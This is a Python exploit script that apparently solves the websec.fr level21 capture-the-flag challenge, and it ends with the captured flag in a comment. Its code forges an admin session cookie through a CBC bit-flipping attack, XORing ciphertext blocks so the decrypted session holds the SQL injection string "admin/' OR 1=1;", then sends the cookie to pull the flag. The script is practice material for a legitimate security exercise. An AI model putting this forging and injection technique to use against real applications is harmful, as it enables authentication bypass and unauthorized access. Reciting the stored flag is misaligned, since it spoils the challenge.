import hashlib
import requests
import re

USERNAME = '111111111111111111111111'
PASSWORD = '111111111111111111111111'
PASSWORD_HASH = hashlib.md5(PASSWORD.encode()).hexdigest()
PLAIN_SESSION = f'user/pass:{USERNAME}/{PASSWORD_HASH}'
DESIRED_PLAIN_SESSION = "user/pass:admin/' OR 1=1;"
BLOCK_SIZE = 16


def get_session():
    resp = requests.post("https://websec.fr/level21/index.php", data={
        "login": True,
        "username": USERNAME,
        "password": PASSWORD
    })
    return bytes.fromhex(resp.cookies.get("session"))


def try_admin_session(sess):
    resp = requests.get("https://websec.fr/level21/index.php", cookies={'session': sess})
    r = resp.text
    if re.search(r"WEBSEC{.*}", r):
        return re.search(r"WEBSEC{.*}", r).group()


def add_padding(blocks, block_size):
    last_block_len = len(blocks) % block_size
    padding_val = block_size - last_block_len
    blocks += bytes([padding_val] * padding_val)
    return blocks


def split_to_blocks(input, block_size):
    if len(input) % block_size != 0:
        input = add_padding(input, block_size)
    return [input[i:i + block_size] for i in range(0, len(input), block_size)]


def calculate_block(cipher_block: bytes, plain_block: bytes, wanted_plain_block: bytes):
    return bytes(x ^ y ^ z for x, y, z in zip(cipher_block, plain_block, wanted_plain_block))


if __name__ == '__main__':
    print("Getting session")
    enc_ses = get_session()
    print(f"Got session - {enc_ses.hex()}")
    enc_ses_blocks = split_to_blocks(enc_ses, BLOCK_SIZE)

    pl_ses = PLAIN_SESSION.encode()
    pl_ses_blocks = split_to_blocks(pl_ses, BLOCK_SIZE)

    payload_ses_blocks = split_to_blocks(DESIRED_PLAIN_SESSION.encode(), BLOCK_SIZE)

    admin_session = b''
    admin_session += calculate_block(enc_ses_blocks[0], pl_ses_blocks[0], payload_ses_blocks[0])
    admin_session += bytes(enc_ses_blocks[1])
    admin_session += calculate_block(enc_ses_blocks[2], pl_ses_blocks[2], payload_ses_blocks[1])
    admin_session += bytes(enc_ses_blocks[3])
    admin_session += bytes(enc_ses_blocks[4])

    print(f"Crafted admin session - {admin_session.hex()}")
    f = try_admin_session(admin_session.hex())
    if not f:
        print("not found admin")
    else:
        print(f)

#  WEBSEC{Have_you_ever_heard_about_patting_attack?}
